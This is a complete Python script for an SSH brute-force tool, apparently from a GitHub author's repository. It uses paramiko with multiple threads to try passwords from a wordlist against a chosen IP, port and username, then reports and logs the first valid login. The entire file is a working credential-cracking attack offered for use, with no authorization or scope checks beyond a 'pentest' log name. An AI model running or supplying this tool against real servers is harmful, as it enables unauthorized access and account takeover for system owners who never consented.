import paramiko
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.panel import Panel
import argparse
import logging
import os
import time
import sys
import threading

console = Console()
stop_event = threading.Event()

# Log
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    filename="pentest_report.log")

# Banner
def show_banner():
    console.print(Panel.fit(
        "[green]SSH Brute Force - v1.0[/green]\n"
        "madeBy - Amirprx3 | https://github.com/Amirprx3"
        "\n[bold red]Logs: pentest_report.log[/bold red]",
        title="SSH-Cracker",
        border_style="magenta"
    ))

# Login ssh
def ssh_login(ip, port, username, password):
    if stop_event.is_set():
        return False

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=username, password=password,
                       timeout=3, allow_agent=False, look_for_keys=False)
        result = f"{ip}:{port} | {username}:{password}"
        console.print(f"\n[green][+] Valid Login Found: {result}[/green]")
        logging.info(f"Valid Login: {result}")
        stop_event.set()
        return True
    except paramiko.AuthenticationException:
        logging.info(f"Failed: {ip}:{port} | {username}:{password}")
    except Exception as e:
        logging.debug(f"Error on {ip}:{port} | {str(e)}")
    finally:
        try:
            client.close()
        except:
            pass
    return False

# Attack
def run_attack(ip, port, username, passwords, threads=10):
    console.print(f"[cyan][*] Starting attack on {ip}:{port} | Passwords: {len(passwords)} | Threads: {threads}[/cyan]")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(ssh_login, ip, port, username, pwd) for pwd in passwords]

        completed = 0
        total = len(futures)

        with console.status("[bold green]Cracking...[/bold green]"):
            for future in as_completed(futures):
                completed += 1
                if stop_event.is_set():
                    break
                console.print(f"[blue]Progress: {completed}/{total}[/blue]", end="\r")

    return stop_event.is_set()

# Arguments
def parse_args():
    parser = argparse.ArgumentParser(
        description="SSH Brute Force Tool - Clean & Fast",
        epilog="Example: python ssh_cracker.py -i 192.168.1.1 -u root -P passwords.txt",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="Target SSH port")
    parser.add_argument("-u", "--username", required=True, help="SSH username")
    parser.add_argument("-P", "--passlist", required=True, help="Path to password list file")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")

    return parser.parse_args()

# Main Run
def main():
    show_banner()
    args = parse_args()

    if not os.path.isfile(args.passlist):
        console.print(f"[red][-] Password file not found: {args.passlist}[/red]")
        sys.exit(1)

    with open(args.passlist, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    start_time = time.time()
    success = run_attack(args.ip, args.port, args.username, passwords, threads=args.threads)
    elapsed = time.time() - start_time

    if success:
        console.print(f"\n[bold green][+] Attack completed in {elapsed:.2f} seconds.[/bold green]")
    else:
        console.print(f"\n[bold red][-] No valid credentials found in {elapsed:.2f} seconds.[/bold red]")

if __name__ == "__main__":
    main()